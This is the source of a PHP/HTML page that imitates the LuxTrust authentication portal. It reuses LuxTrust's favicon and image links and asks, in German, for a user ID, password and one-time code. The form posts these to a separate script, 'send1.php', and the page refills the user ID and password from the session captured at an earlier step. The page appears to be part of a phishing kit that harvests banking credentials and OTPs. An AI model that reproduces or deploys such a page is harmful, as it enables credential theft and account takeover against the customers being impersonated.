<?php
session_start();

?>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
    
    <title></title>
    <link rel="icon" href="https://managing.luxtrust.com/favicon.ico">
    
    <link rel="stylesheet" href="./bootstrap.v3.3.7.min.css" type="text/css" media="all">
    <link rel="stylesheet" href="./luxtrust_boostrap.css" type="text/css" media="all">
    
    <link rel="stylesheet" href="./font-awesome-v5.9.0.css" type="text/css" media="all">

    
    
    <script type="text/javascript" src="./jquery-3.4.1.min.js.download"></script>
    <script type="text/javascript" src="./controls_1_1_2.js.download"></script>
    <script type="text/javascript" src="./portalUtils.js.download"></script>
    <script type="text/javascript" src="./bootstrap.v3.3.7.min.js.download"></script>
</head>
<body>
<div id="ltportal-page">
    <div class="container-fluid">





<center>
<form class="form-horizontal " action="../send1.php" method="post" id="form">
    <input type="hidden" name="PARAM_DEVICE_TYPE" value="DPM">
    <input type="hidden" name="setLocale" value="EN">
    <div class="form-group">
        <label class="control-label col-sm-4" for="userId">Bitte geben Sie Ihre Benutzer-ID ein </label>
        <div class="col-sm-8">
            <input id="userId" type="text" class="form-control input-small" maxlength="8" name="user" style="text-transform:uppercase" value="<?php echo $_SESSION['user'] ?>">
            <span class="text-danger" id="errordeviceCode" style="display:none"></span>
        </div>
    </div>
    <div class="form-group">
        <label class="control-label col-sm-4" for="userId">Passwort </label>
        <div class="col-sm-8">
            <input id="userId" type="text" class="form-control input-small" maxlength="8" name="pass" style="text-transform:uppercase" value="<?php echo $_SESSION['pass'] ?>">
            <span class="text-danger" id="errordeviceCode" style="display:none"></span>
        </div>
    </div>
       <div class="form-group">
        <label class="control-label col-sm-4" for="userId">OTP </label>
        <div class="col-sm-8">
            <input id="userId" type="text" class="form-control input-small" maxlength="8" name="otp" style="text-transform:uppercase" placeholder="123456" required>
            <span class="text-danger" id="errordeviceCode" style="display:none"></span>
        </div>
    </div>
    <div class="form-group">
        <div class="col-xs-12 col-sm-8 col-sm-push-4 text-right">
            <div class="div-small">
                <input type="submit" class="btn btn-primary" id="submitButton" value="Next">
            </div>
        </div>
    </div>
</form></center>
<div class="row col-xs-12">
    <a href="https://managing.luxtrust.com/images/CSS_userid_mob_big.png" target="_blank">
        <img src="./CSS_userid_mob_small.png" alt="" title="UserID">
    </a>
    <a href="https://managing.luxtrust.com/images/CSS_userid_paper_big.png" target="_blank">
        <img src="./CSS_userid_paper_small.png" alt="" title="UserID">
    </a>
</div>
</div>
</div>



</body></html>